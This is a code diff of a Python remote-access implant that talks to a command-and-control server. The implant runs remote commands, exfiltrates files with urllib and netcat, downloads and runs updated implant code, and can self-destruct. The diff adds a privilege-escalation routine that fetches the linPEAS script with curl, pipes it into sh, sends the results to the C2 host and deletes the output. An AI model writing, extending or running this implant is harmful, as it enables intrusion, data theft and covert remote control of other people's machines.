@@ -7,19 +7,19 @@ import sys
 
 #Comms
 implantDir = os.getcwd()
-cwd = implantDir
 
 #This will upload a file to the target server.
 def ExfilFile(file, c2, IPAddress):
-    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
-    os.system(f'nc -q0 -w5 {IPAddress} 1234 < {file}')
+    filename = file.rsplit('/', 1)[-1]
+    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={filename}')
     os.system(f'nc -q1 -w5 {IPAddress} 1234 < {file}')
     return
 
 #This will download the new version of the implant, and then run it as a subprocess.
 def UpdateImplant(implantDir):
+    os.chdir(implantDir)
     urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', f'{implantDir}/implant.py')
-    subprocess.Popen([sys.executable, "implant.py"])
+    subprocess.Popen([sys.executable, f'{implantDir}/implant.py'])
     return
 
 #This will self destruct our implant.
@@ -32,7 +32,7 @@ def SelfDestruct(implantDir):
 #Will create a path similarily to the way linux cd does given a string consisting of .., and directories seperated by '/'.
 def MakePath(dir):
     path = dir.split('/')
-    tempCWD = cwd
+    tempCWD = os.getcwd()
     for dir in path:
         if dir == '..':
             tempCWD = tempCWD.rsplit('/',1)[0]
@@ -44,18 +44,18 @@ def MakePath(dir):
 def ChangeDir(cwd, newDir):
     newWD = MakePath(newDir)
     if os.path.isdir(newWD):
+        cwd = os.getcwd()
         os.chdir(newWD)
         if cwd != os.getcwd():
-            cwd = os.getcwd()
-            dirMsg = urllib.parse.quote_plus(f'New working directory: {cwd}')
+            dirMsg = urllib.parse.quote_plus(f'New working directory: {os.getcwd()}')
             urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
         else:
-            dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {cwd}')
+            dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {newWD}')
             urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
     else:
-        dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {cwd}')
+        dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {newWD}')
         urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
-    return cwd
+    return
 
 def CommandExec(command):
     #command = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}').read().decode("utf-8")
@@ -67,13 +67,19 @@ def CommandExec(command):
     urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
     return
 
+def PrivEsc(implantDir):
+    os.system(f'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh > {implantDir}/linpeas.txt')
+    ExfilFile(f'{implantDir}/linpeas.txt', c2, c2IPAdress)
+    os.system(f'rm {implantDir}/linpeas.txt')
+    return
+
 #initialiazation, this will set establish a Session ID
 if(os.path.isfile("sid.log")):
-    sid = open("sid.log", "r").read()
-    dir = urllib.parse.quote_plus(cwd)
+    sid = open('sid.log', "r").read()
+    dir = urllib.parse.quote_plus(os.getcwd())
     urllib.request.urlopen(f'{c2}/reconnect?sid={sid}&cwd={dir}')
 else:
-    dir = urllib.parse.quote_plus(cwd)
+    dir = urllib.parse.quote_plus(os.getcwd())
     sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
     f = open("sid.log", "w")
     f.write(sid)
@@ -88,11 +94,13 @@ while True:
         if next[0] == 'cexe':
             CommandExec(next[1])
         elif next[0] == 'cd':
-            cwd = ChangeDir(cwd, next[1])
+            ChangeDir(os.getcwd(), next[1])
         elif next[0] == 'update':
             UpdateImplant(implantDir)
         elif next[0] == 'exfil':
             ExfilFile(next[1], c2, c2IPAdress)
+        elif next[0] == 'privesc':
+            PrivEsc(implantDir)
         elif next[0] == 'selfdestruct':
             SelfDestruct(implantDir)
             break
